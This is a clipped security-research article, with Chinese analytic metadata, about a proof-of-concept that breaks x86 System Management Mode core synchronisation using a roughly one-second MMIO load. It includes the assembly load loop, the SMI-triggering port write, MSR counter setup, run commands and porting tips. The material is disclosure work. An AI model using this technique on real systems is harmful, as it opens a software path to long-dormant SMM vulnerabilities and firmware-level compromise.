---
title: Exploiting System Management Mode with a very long interrupt
source: https://github.com/xoreaxeaxeax/smiiiiiiiiiiiiiiii
author:
- '[[WhiteDawn]]'
published: '2026-08-10'
created: '2026-08-11'
manifest_dates:
- '2026-08-11'
description: 'Article URL: https://github.com/xoreaxeaxeax/smiiiiiiiiiiiiiiii Comments
  URL: https://news.ycombinator.com/item?id=49245491 Points: 159 # Comments: 58'
tags:
- clippings
extraction_status: success
pipeline_stage: fact_extracted
id: 77d4093e357af471
source_type: community_discussion
tldr: 安全研究员 Christopher Domas 发布 PoC 项目 smiiiiiiiiiiiiiiii，演示用一条超过 1 秒的极长指令阻止某 CPU
  核心进入 SMM，破坏 SMM 所有核心必须同步进出的安全模型，使软件无需物理访问即可利用现存 100 多个 SMM TOCTOU 漏洞。
objective_summary: 安全研究员 Christopher Domas 在 GitHub 发布 PoC 工具 smiiiiiiiiiiiiiiii，演示如何利用一条持续约
  1 秒的极长指令破坏 x86 CPU 的 SMM 同步机制。SMM 要求所有核心同时进入或退出该模式，并设有约 1 秒的 rendezvous 超时；攻击让一个核心通过慢速
  MMIO 的宽位宽读取指令保持不可中断，另一核心超时后单独执行 SMM 代码。该 PoC 在 Zen 3 Ryzen 7 5800H 上验证了思路，通过对比各核心
  SMI 计数器的偏差检测到不同步。该技术使 100 多个原本休眠的 SMM TOCTOU CVE 可从软件侧利用，目前尚无明确修复方案。
event_type: policy_and_safety
epistemic_status: verified_fact
entities:
  companies:
  - AMD
  technologies:
  - SMM
  - SMI
  - TOCTOU
  - MMIO
  - x86
  key_people:
  - Christopher Domas
key_logic_flow:
- SMM 是 x86 CPU 中安全等级最高的隐蔽执行环境，其安全模型要求所有核心要么同时进入 SMM、要么同时留在外部，任一核心进入时其余核心也必须进入。
- 攻击的核心是让一个核心执行一条持续超过 1 秒（约 40 亿个时钟周期）的单条不可中断指令，使其无法响应 SMI 中断而错过 SMM 同步。
- 另一核心在约 1 秒的同步超时后放弃等待并单独进入 SMM 执行代码，随后退出 SMM，造成两个核心一个在 SMM 内、一个在 SMM 外的不同步状态。
- PoC 在 Zen 3 Ryzen 7 5800H 上通过 vmovdqu 从慢速 MMIO 地址 0xfcc68860 执行 xmm 宽位宽读取来制造约 1
  秒的停顿，并用各核心 SMI 计数器是否出现偏差来验证不同步。
- 该技术移除了利用 SMM TOCTOU CVE 需要物理访问或恶意设备的前置条件，使 100 多个休眠漏洞可从纯软件侧发起利用。
- 该问题难以彻底修复：保留超时则 rendezvous 易被破坏，移除超时则卡住的核心会挂起平台，目前推荐的缓解措施是避免执行长指令。
object_mentions:
- object_type: project
  name: xoreaxeaxeax/smiiiiiiiiiiiiiiii
  canonical_name: xoreaxeaxeax/smiiiiiiiiiiiiiiii
  url: https://github.com/xoreaxeaxeax/smiiiiiiiiiiiiiiii
  confidence: high
  article_role: primary_subject
  evidence_snippets:
  - 该文章围绕 GitHub 项目 smiiiiiiiiiiiiiiii 展开，它是一个用于演示通过超长指令破坏 SMM 核心同步的 PoC 工具。
  - PoC 默认针对 Zen 3 Ryzen 7 5800H 调优，通过从 0xfcc68860 慢速 MMIO 地址执行 xmm 位宽读取来制造约 1 秒的指令停顿。
  - 运行 sudo ./smiiiiiiiiiiiiiiii 可反复触发超长指令并观察各核心 SMI 计数器是否出现偏差。
  article_id: 77d4093e357af471
- object_type: project
  name: mmiotic
  canonical_name: mmiotic
  url: null
  confidence: medium
  article_role: mentioned_reference
  evidence_snippets:
  - 文章建议使用 mmiotic 工具在目标平台上寻找响应缓慢的 MMIO 区域，以构造足以跨越同步超时的长指令。
  article_id: 77d4093e357af471
- object_type: project
  name: asm-hall-of-shame
  canonical_name: asm-hall-of-shame
  url: null
  confidence: medium
  article_role: mentioned_reference
  evidence_snippets:
  - 当单个 MMIO 读取不够慢时，文章建议参考 asm-hall-of-shame 来寻找其他病态的超长指令。
  article_id: 77d4093e357af471
extract_result: success
impact_score:
  score: 7.0
  reason: 从技术实质看，该研究首次以纯软件方式打破 x86 SMM 的全局同步安全模型，将 100+ 休眠 SMM TOCTOU CVE 的利用门槛从'物理访问/恶意
    DMA 设备'降为'本机软件代码'，对服务器固件安全、云主机安全边界构成真实且短期无法闭环的威胁；但从行业层面看，它需要本机代码执行前置条件、PoC 仅在
    Zen 3 特定平台验证、且不改变 AI/商业竞争格局，属于安全研究领域的重大突破而非跨行业范式转移，故评分为 7 分。
sentiment: negative
developer_sentiment:
  tone: excited
  primary_focus: 纯软件指令破坏 SMM 同步模型的可行性与 100+ 休眠 CVE 的实际可利用边界
hype_assessment:
  level: low
  reason: 文章是可复现的安全 PoC，包含完整汇编代码、MSR 配置细节（事件 0x2b 计数器）、端口 0xb2 SMI 触发方式及 Zen 3 5800H
    实测验证，全程未使用'颠覆''革命性'等 PR 词汇；虽标题和'花哨 GUI'带有玩味成分，但不构成概念包装或商业炒作，故判定为 low。
information_entropy: high
domain_disruption:
  technical_innovation: 利用慢速 MMIO 地址配合最宽位宽 load 指令（vmovdqu xmm）构造单条不可中断且耗时超过 1 秒（约
    40 亿时钟周期）的指令，使目标核心在 SMI rendezvous 窗口内无法响应中断，从而破坏'所有核心同进同出 SMM'的同步不变量；攻击者因此能在
    SMM 执行期间让另一核心滞留外部，首次证明纯软件即可将 100+ SMM TOCTOU CVE 从休眠变为可利用状态，动摇了被视为硬件根基的全局同步安全假设。
  business_model: 对云厂商与固件安全生态产生直接压力：推动服务器/云环境重新评估 SMM 信任根假设，加速对硬件级隔离方案（AMD SNP、Intel
    TDX、vTPM 等）的依赖与采购决策，并可能推高固件审计与安全补丁的服务需求；但对 AI/SaaS 软件商业模式本身无直接重塑。
engineering_complexity: prototype
compound_value:
  score: 6.0
  reason: 投资逻辑推演：第一步判断事件属性——这是一则底层硬件安全研究披露（x86 SMM 同步模型的架构级缺陷），本身不是可复利的平台或产品，故不给 8
    分以上。第二步评估影响的持久性——该漏洞直接瓦解 SMM『所有核心同步进出』的安全根基，属于结构性缺陷，短期无干净修复方案（保留超时可被破坏、移除超时会挂起平台），这意味着它对
    AMD 等芯片厂商信任体系的侵蚀是长期、慢性的，具备数年维度的持续性。第三步叠加 AI 行业的资本流向——当前 AI 训练/推理正加速迁移到机密计算（AMD
    SEV-SNP、Intel TDX）以保护模型权重与训练数据，此漏洞从软件侧即可撬动 100+ 沉睡 CVE，直接动摇机密计算的信任前提，将迫使云厂商与大型
    AI 客户在未来数年结构性追加固件审计、硬件安全验证与运行时防护支出。第四步确认资金导流方向——这笔增量支出会流向固件安全、硬件验证工具、以及不依赖 x86
    SMM 的替代安全架构。综合判断：它不是细分赛道的基础设施，但作为安全支出与替代架构的长期催化事件，值得 6.0 分并持续跟踪验证。
value_capture_layer: hardware_compute
moat_impact: creates_new_moat
key_beneficiaries:
- Eclypsium
- Trail of Bits
- Arm 服务器生态 (AWS Graviton/Ampere)
- NVIDIA 机密计算
competitive_casualty:
- AMD (SEV 信任体系受损)
- Microsoft Azure 机密计算 (SEV-SNP)
- Google Cloud 机密计算
- x86 SMM 信任链生态
market_opportunities:
- 安全企业可基于该 PoC 技术开发 SMM 同步完整性检测与固件漏洞审计工具，向云厂商和数据中心提供平台安全评估服务
- 该漏洞凸显机密计算可信根（AMD SEV-SNP/Intel TDX）的脆弱性，建议关注面向 AI 模型防护的 TEE 安全架构升级与加固咨询的创业机会
- CPU 厂商可推动微码级缓解与下一代 SMM 同步机制研发，形成面向企业市场的差异化安全竞争力
risk_matrix:
  regulatory: 该 PoC 将 100 多个休眠 SMM TOCTOU 漏洞从需要物理访问变为纯软件可利用，可能触发网络武器双重用途管控（如出口管制条例）的讨论，并引发负责任披露边界与潜在责任争议
  technological: 该技术依赖特定平台（Zen 3 Ryzen 7 5800H）的慢速 MMIO 地址与指令时序，AMD/Intel 可能通过微码更新或固件补丁予以缓解，未来
    CPU 架构或改变 SMM 同步机制，技术有效性窗口有限
  competitive: 该漏洞动摇 AMD SEV 机密计算等可信平台的安全形象与竞争力，可能促使云厂商在采购和部署时重新评估平台安全等级，为竞争对手创造市场机会
  ethical: 公开可利用 100+ 未修补 CVE 的 PoC 具有双重用途风险，可能在缓解方案落地前被攻击者武器化；同时该研究推动行业正视长期被忽视的休眠漏洞，披露伦理存在正面与负面张力
  additional:
  - 固件供应链与 OEM/ODM 生态修复周期长，波及服务器、PC 与云基础设施，企业难以在短期内全面缓解；依赖 SMM 可信根的机密计算与云租户隔离承诺可能被系统性削弱
confidence:
  impact: high
  compound: medium
  hype: medium
actionable_insight: deep_dive
object_insights:
- object_type: project
  name: xoreaxeaxeax/smiiiiiiiiiiiiiiii
  canonical_name: xoreaxeaxeax/smiiiiiiiiiiiiiiii
  url: https://github.com/xoreaxeaxeax/smiiiiiiiiiiiiiiii
  positioning: 这是安全研究员 Christopher Domas 发布的 PoC 工具，演示用一条约 1 秒的超长指令破坏 x86 SMM 所有核心同步进出的安全模型。
  technical_signal: 项目用约 40 亿周期的单条 vmovdqu 读指令让核心错过 SMI 同步，在 Zen 3 Ryzen 7 5800H 上验证了
    SMM rendezvous 可被纯软件破坏。
  adoption_signal: PoC 已在 Zen 3 Ryzen 7 5800H 上复现验证，并提供带 GUI 的演示界面，供安全社区评估该攻击在自身平台的适用性。
  ecosystem_relevance: 该技术使 100 多个原本休眠的 SMM TOCTOU CVE 可从纯软件侧发起利用，直接影响 x86 固件安全与云平台的租户隔离边界。
  target_users: []
  product_signal: null
  market_signal: null
  differentiation: null
  watch_reason: 该 PoC 首次证明 SMM 的“所有核心同进同出”模型可被单条超长指令从软件侧击破，使百余个休眠漏洞获得新的利用路径；若被恶意软件吸收，影响面将覆盖整个
    x86 生态，且目前尚无明确修复方案，值得持续跟踪漏洞生态与缓解进展。
  risk_notes:
  - PoC 仅针对 Zen 3 Ryzen 7 5800H 调优，其他平台厂商与代际的 MMIO 行为和同步超时实现可能存在差异。
  - 该问题目前缺乏明确修复方案，推荐的缓解措施仅为避免执行长指令，短期难以在系统层面根治。
  score: 8.0
  article_ids:
  - 77d4093e357af471
  evidence_snippets:
  - 该文章围绕 GitHub 项目 smiiiiiiiiiiiiiiii 展开，它是一个用于演示通过超长指令破坏 SMM 核心同步的 PoC 工具。
  - PoC 默认针对 Zen 3 Ryzen 7 5800H 调优，通过从 0xfcc68860 慢速 MMIO 地址执行 xmm 位宽读取来制造约 1 秒的指令停顿。
  - 运行 sudo ./smiiiiiiiiiiiiiiii 可反复触发超长指令并观察各核心 SMI 计数器是否出现偏差。
- object_type: project
  name: mmiotic
  canonical_name: mmiotic
  url: null
  positioning: mmiotic 是一个辅助安全研究的工具，用于在目标平台上扫描并定位响应缓慢的 MMIO 区域，以构造可跨越 SMM 同步超时的超长指令。
  technical_signal: 该工具通过识别高延迟 MMIO 地址，为在不同平台上复现 SMM 长指令攻击提供必要的平台探测能力。
  adoption_signal: 文章在攻击方法说明中明确推荐使用该工具寻找慢速 MMIO 区域，说明它已被安全社区纳入 SMM 攻击链的工作流程。
  ecosystem_relevance: 作为攻击链中的平台探测环节，mmiotic 的能力直接影响 smiiiiiiiiiiiiiiii 能否从单一 Zen
    3 平台迁移到其他 x86 处理器。
  target_users: []
  product_signal: null
  market_signal: null
  differentiation: null
  watch_reason: mmiotic 是 SMM 长指令攻击从单平台验证走向跨平台复现的关键辅助工具，其探测慢速 MMIO 的能力直接决定该攻击面能否扩展到更多
    x86 处理器，值得跟踪其后续更新与兼容性表现。
  risk_notes:
  - 文章未提供 mmiotic 的仓库地址与独立验证信息，其维护状态与兼容性有待进一步确认。
  score: 4.0
  article_ids:
  - 77d4093e357af471
  evidence_snippets:
  - 文章建议使用 mmiotic 工具在目标平台上寻找响应缓慢的 MMIO 区域，以构造足以跨越同步超时的长指令。
- object_type: project
  name: asm-hall-of-shame
  canonical_name: asm-hall-of-shame
  url: null
  positioning: asm-hall-of-shame 是一个收录病态或异常耗时机器指令的案例集合，当单条 MMIO 读取不够慢时，为构造超长指令提供备选方案。
  technical_signal: 该集合汇总了多种可产生异常执行耗时的机器指令，为 SMM 长指令攻击在缺少慢速 MMIO 的平台上提供指令层面的替代路径。
  adoption_signal: 文章在方法说明中明确建议参考该集合寻找其他超长指令，表明它已被用作安全研究中的指令延迟参考资料。
  ecosystem_relevance: 作为超长指令案例的知识库，该集合帮助安全研究人员探索不同 CPU 架构上的延迟攻击，间接扩展 SMM 攻击面的研究覆盖。
  target_users: []
  product_signal: null
  market_signal: null
  differentiation: null
  watch_reason: asm-hall-of-shame 收录的病态长指令是 SMM 攻击在缺乏慢速 MMIO 平台上迁移的关键素材，其内容更新情况与对新
    CPU 指令的覆盖度值得持续关注。
  risk_notes:
  - 文章未给出该集合的仓库地址与维护活跃度，其内容是否覆盖新一代 x86 指令有待验证。
  score: 4.0
  article_ids:
  - 77d4093e357af471
  evidence_snippets:
  - 当单个 MMIO 读取不够慢时，文章建议参考 asm-hall-of-shame 来寻找其他病态的超长指令。
---

Exploiting System Management Mode with a very very very very very very very long interrupt.

It turns out that you can break SMM — the secure, ultra privileged execution environment running invisibly in the background of every x86 CPU — with nothing more than an obscenely long-running machine instruction.

SMM requires that all cores are either in SMM or out of SMM at the same time. Its security model doesn't work without this - when one thread enters SMM, it makes all the others enter too.

To break this, all we need is someone too busy to notice they're supposed to join SMM.

It works something like this:

```
core 0 - start a long instruction
|
|
|
core 1 - invite core 0 to smm
|
|
|
core 1 - enter smm
|
|
|
core 1 - wait for core 0
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
core 1 - wait for core 0
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
core 1 - wait for core 0
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
core 1 - wait for core 0
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
core 1 - wait for core 0
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
core 1 - wait for core 0
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
core 1 - wait for core 0
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
core 1 - wait for core 0
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
|
core 1 - give up
core 1 - do secret smm stuff
core 1 - finish smm
|
|
|
core 0 - join smm
```


At this point, core 1 is out of SMM while core 0 is in, letting core 1 attack
core 0. Here's the catch: for this to work we need a very, very, verrrrry long
instruction — longer than any instruction was ever supposed to take. Most
machine instructions on a modern CPU are fast: `add`

takes 1 cycle. To get core
1 to give up waiting on core 0, we need an instruction on core 0 that takes
around 4,000,000,000 cycles — over 1 second of wall-clock time.

x86 firmware runs the following code when a CPU core enters SMM:

```
for (Timer = StartSyncTimer ();
!IsSyncTimerTimeout (Timer, mTimeoutTicker) && SyncNeeded;
)
{
mSmmMpSyncData->AllApArrivedWithException = AllCpusInSmmExceptBlockedDisabled ();
if (mSmmMpSyncData->AllApArrivedWithException) {
break;
}
CpuPause ();
}
```

The code waits for all cores to enter SMM, or for up to 1 second, whichever
occurs first. To get a core to execute SMM code while another core stays
executing *outside* SMM, we need that outside core to stay uninterruptible for
the *entire* second — an SMI is taken at an instruction boundary, so any gap
between two instructions lets the pending SMI pull the core into SMM. The
delay therefore has to be a *single* instruction: one uninterruptible op that
outlasts the one-second rendezvous.

There are many ways to reach the forbidden 1-second instruction, and the exact approach will vary platform-to-platform. But, roughly: find a high-latency MMIO address, and then convince the CPU to read from it as slowly as possible — abuse an undocumented region that answers reads at a crawl, use the widest load the ISA will give you to move as many bytes as possible across it in a single instruction, and let the other cores contend for the same bus to slow it further. One read, one instruction, and the CPU is stuck holding it for the better part of a second.

The provided proof-of-concept
is tuned for a Zen 3 Ryzen 7
5800H, where a wide `xmm`

load from slow MMIO at
`0xfcc68860`

stalls long enough to break the all-cores rendezvous:

```
mov $0xfcc68860, %rsi ; the target MMIO address
vmovdqu (%rsi), %xmm0 ; the very, very long load
```

The PoC exploits this by pitting two cores against each other. One core is held
*outside* SMM by the long instruction — a tight loop on the very slow load:

```
/* the victim core: spin on the ~1-second load, too busy to answer the SMI */
for (;;)
asm volatile ("vmovdqu (%0), %%xmm0" :: "r"(mmio) : "xmm0");
```

Meanwhile another core arms the per-core SMI counters:

```
#define MSR_PERF_CTL0 0xc0010200 /* AMD core perf event-select MSR */
#define MSR_PERF_CTR0 0xc0010201 /* the paired 48-bit counter */
for (int cpu = 0; cpu < ACTIVE_CPUS; cpu++) {
msr_write(cpu, MSR_PERF_CTL0, 0x43002b); /* EN | OS | USR | event 0x2b */
msr_write(cpu, MSR_PERF_CTR0, 0); /* zero the count */
}
```

Then fires a storm of SMIs:

`asm volatile ("outb %%al, $0xb2" :: "a"(0)); /* kick port 0xb2 -> #SMI */`

And reads every core's tally back:

```
/* ...fire the storm, then read every core's tally back... */
uint64_t delta = smi_max - smi_min;
if (delta)
puts("!!! a core ran outside SMM");
```

If the counts diverge, it means a core kept running *outside* SMM while the
others were pulled in — it missed the SMIs the rest of them serviced.

To better illustrate this, we can run the proof-of-concept behind a needlessly flashy and entirely pointless GUI, tracking SMI counters on each core, to watch them execute in perfect lockstep until a wildly delayed core breaks their required synchronization:

SMM's one guarantee — that nothing else runs while it does — falls apart under a single absurdly long instruction.

SMM's security relies on a simple assumption: while it runs, nothing else does.

There are 100+ SMM TOCTOU CVEs out there: an SMM handler checks a value in
shared memory, then uses it. All you need for exploitation is to rewrite
that value in between the check and use, and you're inside SMM. But these
issues sit *dormant* and largely unpatched in the wild, because of one
assumption: exploitation requires something to modify the shared memory *while
SMM executes*, and because of the SMM rendezvous no CPU cores are outside SMM to
launch an attack. The only way in was a DMA-capable peripheral writing behind
the CPU's back — physical access, a malicious device — so the whole class is
written off as a hardware problem.

SMI desynchronization removes the prerequisite that kept the platform safe: an outside core, no physical access or hardware required, can now run while SMM executes — and the dormant CVEs become exploitable from software.

There probably aren't any, which is what makes this one somewhat more interesting than traditional SMM issues. Keep the timeout, and the rendezvous is easily broken. Remove the timeout, and a legitimately stuck core hangs the platform on the first SMI. Increase the timeout, and you kill performance on many-core platforms that are forced to quiesce all cores every SMM entry. It's not clear what the best path forward is, or if there is even a path forward at all.

Until then, the recommended workaround is to not execute any long instructions.

The default `vmovdqu`

at `0xfcc68860`

in the proof-of-concept is a slow spot on
*this* box — a Zen 3 Ryzen 7 5800H — and likely nowhere else. To break the
rendezvous on *your* box, you will need to retune the long instruction so the
stall outlasts *your* SMM timeout. Some tips on how to do this:

**Aim at your MMIO.**Find a slow MMIO region on your platform with mmiotic.**Widen the read.**Step`-r xmm → ymm → zmm`

until the stall crosses the rendezvous timeout.**Swap the instruction.**If no single MMIO read is slow enough, you need a different pathologically long instruction; the asm-hall-of-shame shows how to find them.

`make # builds smiiiiiiiiiiiiiiii`

**The defaults are tuned to one machine.** On anything but a Zen 3 Ryzen 7
5800H, expect no divergence until you retune the long instruction — see
Porting to your platform.

Run the tool to repeatedly fire the very-very-long instruction while watching each core's SMI counter for a divergence:

`sudo ./smiiiiiiiiiiiiiiii # default: -r xmm at 0xfcc68860`

**Flags:**

| Flag | Default | Description |
|---|---|---|
`-r xmm|ymm|zmm` |
`xmm` |
Vector register width for the timed MMIO read (16/32/64 bytes). If no SMI count delta is observed, the tool advises stepping up to the next size. |
`-a <phys-addr>` |
`0xfcc68860` |
Target physical address for the MMIO timing loop (hex `0x...` or decimal). |
`-h` , `--help` |
— | Print usage and exit. |

`smiiiiiiiiiiiiiiii`

is a research effort from Christopher Domas (@xoreaxeaxeax).